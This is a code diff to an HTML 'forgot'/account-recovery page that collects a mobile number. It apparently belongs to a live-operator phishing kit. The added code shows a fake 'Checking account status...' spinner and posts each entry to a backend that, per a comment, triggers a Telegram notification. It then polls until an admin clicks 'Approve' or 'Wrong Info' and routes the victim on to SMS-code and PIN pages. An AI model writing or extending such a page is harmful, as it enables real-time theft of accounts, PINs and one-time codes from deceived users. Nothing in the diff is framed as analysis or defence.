@@ -21,6 +21,11 @@
         .forgot-send-btn { width: 100%; height: 60px; background: #991676; color: #ffffff; border: none; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; text-decoration: none; }
         .forgot-send-btn.disabled-state { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
 
+        /* Loading Spinner */
+        #loadingSpinner { display: none; flex-direction: row; align-items: center; justify-content: center; gap: 12px; margin-top: 20px; font-size: 15px; color: #991676; font-weight: 600; }
+        .spinner { width: 24px; height: 24px; border: 3px solid rgba(153, 22, 118, 0.2); border-top: 3px solid #991676; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         /* Custom Modal Dialog */
         #customModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(153, 22, 118, 0.9); justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
         .modal-card { background: #991676; width: 100%; max-width: 320px; border-radius: 24px; padding: 28px; text-align: center; color: #ffffff; }
@@ -44,6 +49,12 @@
             </div>
 
             <button type="button" id="sendBtn" class="forgot-send-btn">send</button>
+
+            <!-- Loading Spinner -->
+            <div id="loadingSpinner">
+                <div class="spinner"></div>
+                <span>Checking account status...</span>
+            </div>
         </div>
     </div>
 
@@ -56,18 +67,26 @@
     </div>
 
     <script>
-        function showAppAlert(message) {
+        let pendingAction = null;
+
+        function showAppAlert(message, actionCallback = null) {
             document.getElementById('modalText').innerText = message;
             document.getElementById('customModal').style.display = 'flex';
+            pendingAction = actionCallback;
         }
 
         function closeModal() {
             document.getElementById('customModal').style.display = 'none';
+            if (pendingAction) {
+                pendingAction();
+                pendingAction = null;
+            }
         }
 
         document.getElementById('sendBtn').addEventListener('click', async () => {
             const phoneVal = document.getElementById('recoveryPhone').value.trim();
             const sendBtn = document.getElementById('sendBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
 
             if (!phoneVal || phoneVal.length < 8) {
                 showAppAlert('❌ Please enter a valid mobile number.');
@@ -79,7 +98,7 @@
 
             try {
                 sendBtn.classList.add('disabled-state');
-                sendBtn.innerText = 'Sending...';
+                if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
                 // Submit recovery request to server & trigger Telegram notification
                 const response = await fetch('/api/submit-order', {
@@ -94,20 +113,49 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    // Proceed to scratch2.html for SMS verification
-                    window.location.href = 'scratch2.html';
+                    // Start polling: strictly waits for admin to click 'Approve' or 'Wrong Info'
+                    pollApprovalStatus(fullPhone);
                 } else {
                     sendBtn.classList.remove('disabled-state');
-                    sendBtn.innerText = 'send';
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                     showAppAlert('❌ Failed to submit. Please try again.');
                 }
             } catch (error) {
                 console.error('Error:', error);
                 sendBtn.classList.remove('disabled-state');
-                sendBtn.innerText = 'send';
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('Could not connect to the backend server.');
             }
         });
+
+        function pollApprovalStatus(phone) {
+            const cleanPhone = phone.trim();
+            const sendBtn = document.getElementById('sendBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
+
+            const statusInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
+                    const data = await response.json();
+
+                    // ONLY proceed when admin clicks Approve
+                    if (data.status === 'approved') {
+                        clearInterval(statusInterval);
+                        window.location.href = 'scratch2.html';
+                    } 
+                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
+                        clearInterval(statusInterval);
+                        if (spinnerDiv) spinnerDiv.style.display = 'none';
+                        sendBtn.classList.remove('disabled-state');
+                        showAppAlert('❌ Number not recognized or rejected.', () => {
+                            window.location.href = 'pin3.html';
+                        });
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
     </script>
 </body>
 </html>
